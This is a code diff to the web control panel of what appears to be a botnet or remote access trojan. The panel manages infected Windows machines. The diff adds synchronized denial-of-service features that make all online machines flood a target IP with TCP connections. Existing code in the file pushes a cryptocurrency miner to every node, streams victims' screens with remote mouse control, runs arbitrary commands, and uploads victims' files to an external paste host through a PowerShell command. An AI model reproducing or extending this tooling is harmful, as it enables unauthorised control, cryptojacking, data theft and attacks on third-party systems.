@@ -38,7 +38,7 @@
         .offline .status-dot { background: #333; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        /* Layout */
+        /* Main View */
         .main-view { display: flex; flex-direction: column; overflow: hidden; }
         .top-nav { height: 60px; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 2rem; }
         .stats-bar { display: flex; background: #050000; border-bottom: 1px solid var(--border); padding: 10px 2rem; gap: 3rem; }
@@ -58,7 +58,7 @@
         #command-output { flex: 1; padding: 1.5rem; font-family: 'JetBrains Mono'; font-size: 0.85rem; overflow-y: auto; color: #ff3333; border-bottom: 1px solid var(--border); white-space: pre-wrap; }
         #command-input { background: none; border: none; color: white; font-family: 'JetBrains Mono'; padding: 15px; width: 100%; outline: none; }
 
-        /* Explorer Restored */
+        /* Explorer */
         .file-browser { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
         .file-header { padding: 1rem; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
         .file-item { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid var(--border); cursor: pointer; }
@@ -68,13 +68,19 @@
         .file-name { font-size: 0.9rem; font-family: 'JetBrains Mono'; color: #fff; }
 
         .btn-primary { background: var(--accent); color: white; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
-        .btn-secondary { background: #111; border: 1px solid var(--border); color: #fff; padding: 5px 10px; cursor: pointer; font-size: 0.75rem; }
+        .btn-secondary { background: #111; border: 1px solid var(--border); color: #fff; padding: 5px 10px; cursor: pointer; font-size: 0.75rem; transition: 0.2s; }
+        .btn-secondary:hover { border-color: red; color: red; }
         .btn-danger { background: #440000; color: white; border: 1px solid red; padding: 8px 15px; cursor: pointer; }
-        .meta-input { background: #000; border: 1px solid var(--border); color: white; padding: 8px; width: 100%; margin-top: 5px; }
+        .meta-input { background: #000; border: 1px solid var(--border); color: white; padding: 8px; width: 100%; margin-top: 5px; border-radius: 2px; }
         
         /* Remote Desktop Overlay */
         #control-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; }
         #control-image { max-height: 90vh; border: 2px solid var(--accent); cursor: crosshair; background: #000; }
+
+        .quick-tool-card { background: var(--panel); border: 1px solid var(--border); padding: 1.5rem; border-radius: 4px; }
+        .quick-tool-card h4 { margin: 0 0 1rem 0; font-size: 0.8rem; text-transform: uppercase; color: var(--accent); letter-spacing: 1px; }
+
+        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; }
 
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: var(--bg); }
@@ -84,7 +90,7 @@
 <body>
 
 <div id="control-overlay">
-    <div style="margin-bottom: 10px; font-weight: bold; color: var(--accent); letter-spacing: 2px;">REMOTE SESSION ACTIVE | ESC TO EXIT</div>
+    <div style="margin-bottom: 10px; font-weight: bold; color: var(--accent); letter-spacing: 2px;">REMOTE SESSION | ESC TO EXIT</div>
     <img id="control-image" src="" alt="Live Stream">
 </div>
 
@@ -99,7 +105,15 @@
                 <button class="btn-primary" onclick="broadcastMining('start')" style="font-size: 0.7rem;">Start All</button>
                 <button class="btn-danger" onclick="broadcastMining('stop')" style="font-size: 0.7rem;">Kill All</button>
             </div>
-            <button onclick="broadcastStress()" style="width: 100%; margin-top: 5px; background: #200; color: red; border: 1px solid red; font-size: 0.7rem; cursor: pointer; padding: 5px;">Sync DoS Attack</button>
+            
+            <div style="margin-top: 15px; border-top: 1px solid var(--border); padding-top: 10px;">
+                <input type="text" id="broadcast-stress-ip" placeholder="Target IP" class="meta-input" style="font-size: 0.7rem; margin-bottom: 5px;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
+                    <input type="number" id="broadcast-stress-port" placeholder="Port" value="80" class="meta-input" style="font-size: 0.7rem;">
+                    <input type="number" id="broadcast-stress-count" placeholder="Requests" value="1000" class="meta-input" style="font-size: 0.7rem;">
+                </div>
+                <button onclick="broadcastStress()" style="width: 100%; margin-top: 8px; background: #200; color: red; border: 1px solid red; font-size: 0.7rem; cursor: pointer; padding: 5px;">Sync DoS Attack</button>
+            </div>
         </div>
 
         <div class="client-list">
@@ -132,11 +146,11 @@
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('tab-terminal')">Console</button>
             <button class="tab-btn" onclick="switchTab('tab-files')">Files</button>
-            <button class="tab-btn" onclick="switchTab('tab-tools')">Miner</button>
+            <button class="tab-btn" onclick="switchTab('tab-tools')">Tools</button>
             <button class="tab-btn" onclick="switchTab('tab-identity')">Identity</button>
         </div>
 
-        <!-- TABS -->
+        <!-- CONSOLE -->
         <div id="tab-terminal" class="content-area active">
             <div style="display: flex; gap: 1rem; height: 100%;">
                 <div style="flex: 2; display: flex; flex-direction: column;">
@@ -146,13 +160,13 @@
                     </div>
                 </div>
                 <div style="flex: 1; display: flex; flex-direction: column; gap: 1rem;">
-                    <div style="background: var(--panel); padding: 1rem; border: 1px solid var(--border);">
-                        <h4 style="margin:0 0 10px 0; font-size: 0.7rem; color: var(--accent);">LIVE MONITOR</h4>
+                    <div class="quick-tool-card">
+                        <h4>Live Monitor</h4>
                         <img id="screenshot-image" style="width:100%; border: 1px solid var(--border); cursor: pointer; background:#000;" onclick="enterControlMode()">
                         <button class="btn-primary" style="width:100%; margin-top:10px" onclick="enterControlMode()">Remote Desktop</button>
                     </div>
-                    <div style="background: var(--panel); padding: 1rem; border: 1px solid var(--border);">
-                        <h4 style="margin:0 0 10px 0; font-size: 0.7rem; color: var(--accent);">NODE INTEL</h4>
+                    <div class="quick-tool-card">
+                        <h4>Node Intel</h4>
                         <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; line-height: 1.8;">
                             Mining: <span id="node-stat-mining" style="color:var(--accent)">Null</span><br>
                             Rate: <span id="node-stat-rate" style="color:var(--accent)">0 H/s</span><br>
@@ -163,29 +177,50 @@
             </div>
         </div>
 
+        <!-- FILE EXPLORER -->
         <div id="tab-files" class="content-area">
             <div class="file-browser">
                 <div class="file-header">
                     <div id="current-path-display" style="font-family: 'JetBrains Mono'; font-size: 0.8rem; color: var(--accent);">C:\</div>
-                    <button class="btn-primary" onclick="refreshFiles()" style="font-size: 0.7rem;">Refresh</button>
+                    <button class="btn-primary" onclick="refreshFiles()" style="font-size: 0.7rem;">Refresh Explorer</button>
                 </div>
                 <div id="file-list-container" style="max-height: 600px; overflow-y: auto;"></div>
             </div>
         </div>
 
+        <!-- TOOLS TAB -->
         <div id="tab-tools" class="content-area">
-             <div style="background: var(--panel); border: 1px solid var(--border); padding: 1rem;">
-                <h4>Node Miner</h4>
-                <input type="text" id="miner-wallet" placeholder="Wallet Address" class="meta-input">
-                <div style="margin-top: 10px; display: flex; gap: 10px;">
-                    <button class="btn-primary" onclick="runMiner('start')">Start</button>
-                    <button class="btn-danger" onclick="runMiner('stop')">Stop</button>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
+                <div class="quick-tool-card">
+                    <h4>Crypto Miner</h4>
+                    <input type="text" id="miner-wallet" placeholder="Wallet Address" class="meta-input">
+                    <div style="margin-top: 1rem; display: flex; gap: 10px;">
+                        <button class="btn-primary" onclick="runMiner('start')">Start</button>
+                        <button class="btn-danger" onclick="runMiner('stop')">Stop</button>
+                    </div>
                 </div>
-             </div>
+                <div class="quick-tool-card">
+                    <h4>Broadcast Stress Test (DoS)</h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <input type="text" id="stress-host" placeholder="Target IP" class="meta-input">
+                        <input type="number" id="stress-port" value="80" class="meta-input">
+                    </div>
+                    <button class="btn-danger" style="width:100%; margin-top: 1rem;" onclick="launchStressTest()">Launch Synchronized Attack</button>
+                </div>
+                <div class="quick-tool-card" style="grid-column: span 2;">
+                    <h4>Macros</h4>
+                    <div style="display: flex; gap: 10px; margin-bottom: 1rem;">
+                        <input type="text" id="new-macro-name" placeholder="Macro Name" class="meta-input">
+                        <input type="text" id="new-macro-cmd" placeholder="Command" class="meta-input">
+                        <button class="btn-primary" onclick="addMacro()">Save Macro</button>
+                    </div>
+                    <div id="macro-container" class="btn-group"></div>
+                </div>
+            </div>
         </div>
 
         <div id="tab-identity" class="content-area">
-            <div style="background: var(--panel); border: 1px solid var(--border); padding: 1rem;">
+            <div class="quick-tool-card">
                 <h4>Node Alias</h4>
                 <input type="text" id="edit-alias" class="meta-input">
                 <h4 style="margin-top:20px">Description</h4>
@@ -212,6 +247,41 @@
     const DIR_JSON_MARKER = '##DIR_JSON##';
     const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
 
+    // COOKIE HELPERS
+    function setCookie(name, value, days = 365) {
+        const d = new Date();
+        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+        document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
+    }
+
+    function getCookie(name) {
+        const nameEQ = name + "=";
+        const ca = document.cookie.split(';');
+        for (let i = 0; i < ca.length; i++) {
+            let c = ca[i];
+            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+        }
+        return "";
+    }
+
+    // Initialize wallet from cookies
+    const savedWallet = getCookie("erratic_wallet");
+    if (savedWallet) {
+        document.getElementById('global-miner-wallet').value = savedWallet;
+        document.getElementById('miner-wallet').value = savedWallet;
+    }
+
+    // Save wallet to cookies on change
+    ['global-miner-wallet', 'miner-wallet'].forEach(id => {
+        document.getElementById(id).addEventListener('input', (e) => {
+            const val = e.target.value;
+            setCookie("erratic_wallet", val);
+            document.getElementById('global-miner-wallet').value = val;
+            document.getElementById('miner-wallet').value = val;
+        });
+    });
+
     function switchTab(tabId) {
         document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -234,8 +304,8 @@
             div.className = `client-card ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
             div.innerHTML = `
                 <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <div><span class="status-dot"></span>${client.alias || client.hostname}</div>
-                    ${isMining ? `<span style="font-size:0.6rem; color:red;">${Math.floor(state.hashrate)} H/s</span>` : ''}
+                    <div style="font-weight:600; font-size:0.85rem;"><span class="status-dot"></span>${client.alias || client.hostname}</div>
+                    ${isMining ? `<span style="font-size:0.6rem; color:red; font-family:monospace;">${Math.floor(state.hashrate)} H/s</span>` : ''}
                 </div>
             `;
             if (client.online) div.onclick = () => selectClient(client);
@@ -248,13 +318,11 @@
         const targetClient = allConnectedClients.find(c => c.id === data.client_id);
         if (!targetClient) return;
 
-        // 1. FILE SYSTEM HANDLER
         if (data.output.includes(DIR_JSON_MARKER)) {
             renderFileSystem(data.output.substring(data.output.indexOf(DIR_JSON_MARKER) + DIR_JSON_MARKER.length));
             return;
         }
 
-        // 2. MINING REGEX
         const match = data.output.match(HASH_REGEX);
         if (match) {
             const rate = parseFloat(match[1]);
@@ -267,7 +335,6 @@
             if (data.client_id === current_client_id) refreshMiningUI();
         }
 
-        // 3. CONSOLE OUTPUT
         if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
         commandHistory[targetClient.hostname] += data.output;
         if (data.client_id === current_client_id) {
@@ -277,19 +344,23 @@
         }
     });
 
-    /* FILE EXPLORER (Original Restored) */
+    /* FILE EXPLORER FIX */
     function refreshFiles() {
-        if (!current_client_id || !clientStates[current_client_hostname]) return;
-        const path = clientStates[current_client_hostname].currentPath;
+        if (!current_client_id || !current_client_hostname) return;
+        // Ensure state exists before reading path
+        if (!clientStates[current_client_hostname]) {
+            clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+        }
+        const path = clientStates[current_client_hostname].currentPath || "C:\\";
         const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
         socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     }
 
     function renderFileSystem(jsonStr) {
         const container = document.getElementById('file-list-container');
-        const pathDisplay = document.getElementById('current-path-display');
+        if (!current_client_hostname || !clientStates[current_client_hostname]) return;
         let currentPath = clientStates[current_client_hostname].currentPath;
-        pathDisplay.textContent = currentPath;
+        document.getElementById('current-path-display').textContent = currentPath;
         container.innerHTML = '';
 
         const back = document.createElement('div');
@@ -297,11 +368,7 @@
         back.innerHTML = `<div class="file-icon">📁</div><div class="file-meta"><div class="file-name">.. (Parent Directory)</div></div>`;
         back.onclick = () => {
             const parts = currentPath.split('\\').filter(p => p.length > 0);
-            if (parts.length > 1) { 
-                parts.pop(); 
-                clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; 
-                refreshFiles(); 
-            }
+            if (parts.length > 1) { parts.pop(); clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; refreshFiles(); }
         };
         container.appendChild(back);
 
@@ -311,20 +378,8 @@
             items.forEach(item => {
                 const el = document.createElement('div');
                 el.className = 'file-item';
-                el.innerHTML = `
-                    <div class="file-icon">${item.IsDirectory ? '📁' : '📄'}</div>
-                    <div class="file-meta">
-                        <div class="file-name">${item.Name}</div>
-                        ${!item.IsDirectory ? `<div style="font-size:0.7rem; color:gray">${(item.Size / 1024).toFixed(1)} KB</div>` : ''}
-                    </div>
-                    ${!item.IsDirectory ? `<button class="btn-secondary" onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}
-                `;
-                el.onclick = () => {
-                    if (item.IsDirectory) {
-                        clientStates[current_client_hostname].currentPath = currentPath.endsWith('\\') ? currentPath + item.Name + '\\' : currentPath + '\\' + item.Name + '\\';
-                        refreshFiles();
-                    }
-                };
+                el.innerHTML = `<div class="file-icon">${item.IsDirectory ? '📁' : '📄'}</div><div class="file-meta"><div class="file-name">${item.Name}</div></div>${!item.IsDirectory ? `<button class="btn-secondary" onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}`;
+                el.onclick = () => { if (item.IsDirectory) { clientStates[current_client_hostname].currentPath = currentPath.endsWith('\\') ? currentPath + item.Name + '\\' : currentPath + '\\' + item.Name + '\\'; refreshFiles(); } };
                 container.appendChild(el);
             });
         } catch (e) { container.innerHTML = `<div style="padding:20px; color:red">Access Denied.</div>`; }
@@ -334,11 +389,11 @@
         event.stopPropagation();
         const fullPath = (clientStates[current_client_hostname].currentPath + name).replace(/'/g, "''");
         const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
-        const uploadCmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Upload Finished - Link unavailable' }"`;
-        socket.emit('command', { 'command': uploadCmd, 'client_id': current_client_id });
+        const cmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Upload Finished' }"`;
+        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     }
 
-    /* REMOTE DESKTOP (Coordinate Fix) */
+    /* REMOTE DESKTOP */
     function enterControlMode() {
         if (!current_client_id) return;
         isControlMode = true;
@@ -351,42 +406,14 @@
         const rect = this.getBoundingClientRect();
         const x = Math.floor(((e.clientX - rect.left) / rect.width) * 65535);
         const y = Math.floor(((e.clientY - rect.top) / rect.height) * 65535);
-        const clickCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0);"`;
-        socket.emit('command', { 'command': clickCmd, 'client_id': current_client_id });
+        const cmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0);"`;
+        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     };
 
-    window.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape' && isControlMode) {
-            isControlMode = false;
-            document.getElementById('control-overlay').style.display = 'none';
-            socket.emit('command', { 'command': '#scrsht reset', 'client_id': current_client_id });
-        }
-    });
+    window.addEventListener('keydown', (e) => { if (e.key === 'Escape' && isControlMode) { isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; socket.emit('command', { 'command': '#scrsht reset', 'client_id': current_client_id }); } });
+    socket.on('screenshot_data', (data) => { if (data.client_id === current_client_id) { const s = "data:image/jpeg;base64," + data.image_data; document.getElementById('screenshot-image').src = s; if (isControlMode) document.getElementById('control-image').src = s; } });
 
-    socket.on('screenshot_data', (data) => {
-        if (data.client_id === current_client_id) {
-            const imgStr = "data:image/jpeg;base64," + data.image_data;
-            document.getElementById('screenshot-image').src = imgStr;
-            if (isControlMode) document.getElementById('control-image').src = imgStr;
-        }
-    });
-
-    /* CORE HELPERS */
-    function selectClient(client) {
-        current_client_id = client.id;
-        current_client_hostname = client.hostname;
-        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
-        document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
-        document.getElementById('command-output').textContent = commandHistory[client.hostname] || "Terminal initialized...\n";
-        if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
-        refreshMiningUI();
-    }
-
-    function sendCommand() {
-        const inp = document.getElementById('command-input');
-        if (current_client_id && inp.value) { socket.emit('command', { command: inp.value, client_id: current_client_id }); inp.value = ''; }
-    }
-
+    /* TOOLS & BROADCAST */
     function broadcastMining(action) {
         const wallet = document.getElementById('global-miner-wallet').value || "WORKER";
         allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: c.id }); });
@@ -397,33 +424,77 @@
         socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: current_client_id });
     }
 
-    function updateGlobalStats() {
-        let totalHash = 0, totalShares = 0, workers = 0;
-        const now = Date.now();
-        allConnectedClients.forEach(c => {
-            const state = clientStates[c.hostname];
-            if (state && (now - state.lastSeen) < STALE_MS) {
-                totalHash += state.hashrate; totalShares += state.shares;
-                if (state.hashrate > 0) workers++;
-            }
+    function broadcastStress() {
+        const host = document.getElementById('broadcast-stress-ip').value;
+        const port = document.getElementById('broadcast-stress-port').value;
+        const count = document.getElementById('broadcast-stress-count').value || 1000;
+        if(!host) return;
+        const cmd = `powershell -Command "1..${count} | ForEach { $t = New-Object Net.Sockets.TcpClient; try { $t.Connect('${host}', ${port}); $t.Close() } catch {} }"`;
+        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: cmd, client_id: c.id }); });
+    }
+
+    function launchStressTest() {
+        const host = document.getElementById('stress-host').value;
+        const port = document.getElementById('stress-port').value;
+        if(!host) return;
+        const cmd = `powershell -Command "1..1000 | ForEach { $t = New-Object Net.Sockets.TcpClient; try { $t.Connect('${host}', ${port}); $t.Close() } catch {} }"`;
+        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: cmd, client_id: c.id }); });
+    }
+
+    function addMacro() {
+        const name = document.getElementById('new-macro-name').value;
+        const command = document.getElementById('new-macro-cmd').value;
+        if(name && command) socket.emit('add_macro', {name, command});
+    }
+
+    socket.on('macro_list', (macros) => {
+        const container = document.getElementById('macro-container');
+        container.innerHTML = '';
+        macros.forEach(m => {
+            const btn = document.createElement('button');
+            btn.className = 'btn-secondary';
+            btn.textContent = m.name;
+            btn.onclick = () => socket.emit('command', { command: m.command, client_id: current_client_id });
+            container.appendChild(btn);
         });
-        document.getElementById('net-hashrate').textContent = totalHash.toLocaleString() + " H/s";
-        document.getElementById('net-shares').textContent = totalShares;
-        document.getElementById('net-workers').textContent = workers;
+    });
+
+    /* HELPERS */
+    function selectClient(client) {
+        current_client_id = client.id; current_client_hostname = client.hostname;
+        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+        document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
+        document.getElementById('command-output').textContent = commandHistory[client.hostname] || "Connected.\n";
+        if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
+        refreshMiningUI();
+    }
+
+    function sendCommand() {
+        const inp = document.getElementById('command-input');
+        if (current_client_id && inp.value) { socket.emit('command', { command: inp.value, client_id: current_client_id }); inp.value = ''; }
+    }
+
+    function updateGlobalStats() {
+        let h = 0, s = 0, w = 0, now = Date.now();
+        allConnectedClients.forEach(c => {
+            const st = clientStates[c.hostname];
+            if (st && (now - st.lastSeen) < STALE_MS) { h += st.hashrate; s += st.shares; if (st.hashrate > 0) w++; }
+        });
+        document.getElementById('net-hashrate').textContent = h.toLocaleString() + " H/s";
+        document.getElementById('net-shares').textContent = s;
+        document.getElementById('net-workers').textContent = w;
     }
 
     function refreshMiningUI() {
-        const state = clientStates[current_client_hostname];
-        const isMining = state && (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
-        document.getElementById('node-stat-mining').textContent = isMining ? "ACTIVE" : "Null";
-        document.getElementById('node-stat-rate').textContent = isMining ? state.hashrate.toLocaleString() + " H/s" : "0 H/s";
-        document.getElementById('node-stat-shares').textContent = state ? state.shares : "0";
+        if (!current_client_hostname || !clientStates[current_client_hostname]) return;
+        const st = clientStates[current_client_hostname];
+        const m = st && (Date.now() - st.lastSeen) < STALE_MS && st.hashrate > 0;
+        document.getElementById('node-stat-mining').textContent = m ? "ACTIVE" : "Null";
+        document.getElementById('node-stat-rate').textContent = m ? st.hashrate.toLocaleString() + " H/s" : "0 H/s";
+        document.getElementById('node-stat-shares').textContent = st ? st.shares : "0";
     }
 
-    function saveMetadata() { 
-        socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); 
-    }
-
+    function saveMetadata() { socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); }
     setInterval(() => { updateGlobalStats(); if (current_client_id) refreshMiningUI(); }, 2000);
     {% endraw %}
 </script>
